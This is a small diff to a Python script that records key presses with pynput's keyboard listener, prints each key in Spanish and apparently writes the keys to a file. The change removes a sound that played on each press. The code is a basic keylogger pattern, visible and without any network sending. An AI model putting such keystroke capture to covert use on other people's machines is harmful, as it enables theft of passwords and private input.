@@ -1,4 +1,3 @@
-from playsound import playsound
 from pynput.keyboard import Key, Listener
 
 keys = []
@@ -14,7 +13,6 @@ def write_file(keys):
 def on_press(key):
   global keys, count
   keys.append(key)
-  playsound('example.wav')
   print(f'Se presionó la tecla {key}') 
 
   count += 1
